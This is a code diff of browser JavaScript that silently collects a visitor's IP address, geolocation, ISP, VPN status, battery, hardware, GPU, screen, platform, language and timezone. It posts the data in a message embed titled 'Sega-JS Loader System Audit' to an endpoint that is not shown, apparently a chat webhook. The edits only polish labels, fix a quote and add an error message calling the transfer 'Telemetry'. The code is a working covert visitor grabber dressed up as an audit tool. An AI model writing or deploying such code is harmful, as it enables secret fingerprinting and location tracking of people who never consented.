@@ -18,7 +18,7 @@
                         ip: data.ip || 'Unknown',
                         geo: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || data.country || 'Unknown'}`,
                         isp: data.org || data.isp || 'Unknown',
-                        vpn: isVpn ? '⚠️ YES (VPN/Proxy Detected)' : '✅ No'
+                        vpn: isVpn ? '⚠️ YES' : '✅ No'
                     };
                 }
             } catch (e) {}
@@ -33,7 +33,7 @@
                 return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
             }
         } catch (e) {}
-        return 'Unsupported';
+        return 'Unsupported/Desktop';
     }
 
     function getHardware() {
@@ -53,6 +53,7 @@
         };
     }
 
+    // Execution logic
     const net = await getNetworkDetails();
     const batt = await getBattery();
     const hw = getHardware();
@@ -68,11 +69,11 @@
         "CPU/RAM": `${hw.cores} Cores / ${hw.ram}`,
         "GPU": hw.gpu,
         "Screen": `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
-        "OS/Platform": navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model']).then(v => v.model)) : navigator.platform,
+        "OS/Platform": navigator.platform,
         "Browser": navigator.appName,
         "Language": navigator.language,
         "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "Cookies": navigator.cookieEnabled ? 'Yes' : 'No',
+        "Cookies Enabled": navigator.cookieEnabled ? 'Yes' : 'No',
         "Timestamp": new Date().toISOString()
     };
 
@@ -92,8 +93,11 @@
                     title: "Sega-JS Loader System Audit",
                     color: 3066993,
                     fields: fields,
-                    footer: { text: “TGOBS v4.2" }
+                    footer: { text: "TGOBS v4.2" }
                 }]
             })
         });
-    } catch (err) {}
+    } catch (err) {
+        console.error("Telemetry transmission failed.");
+    }
+})();
